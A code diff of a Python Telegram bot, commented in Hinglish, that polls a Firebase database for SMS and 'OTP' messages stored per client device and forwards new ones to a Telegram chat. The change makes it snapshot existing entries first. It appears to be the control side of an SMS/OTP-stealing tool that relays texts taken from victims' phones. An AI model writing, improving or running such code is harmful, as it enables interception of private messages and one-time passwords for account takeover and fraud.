@@ -184,11 +184,18 @@ async def add_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def monitor_task(chat_id, context):
     global is_monitoring, selected_device_id
-    last_processed_ids = set() # Duplicate rokne ke liye set use kiya hai
+    
+    # 1. Start hote waqt existing keys ka snapshot lelo
+    last_processed_ids = set()
+    try:
+        sms_data = requests.get(f"{firebase_base}/{selected_device_id}/sms.json").json() or {}
+        msg_data = requests.get(f"{firebase_base.replace('/clients', '')}/messages/{selected_device_id}.json").json() or {}
+        last_processed_ids.update(sms_data.keys())
+        last_processed_ids.update(msg_data.keys())
+    except: pass
     
     while is_monitoring:
         try:
-            # SMS Check
             sms_url = f"{firebase_base}/{selected_device_id}/sms.json"
             sms_data = requests.get(sms_url).json()
             if sms_data and isinstance(sms_data, dict):
@@ -197,7 +204,6 @@ async def monitor_task(chat_id, context):
                         last_processed_ids.add(key)
                         await context.bot.send_message(chat_id=chat_id, text=f"📱 New SMS:\n{val}")
             
-            # Messages/OTP Check
             msg_url = f"{firebase_base.replace('/clients', '')}/messages/{selected_device_id}.json"
             msg_data = requests.get(msg_url).json()
             if msg_data and isinstance(msg_data, dict):
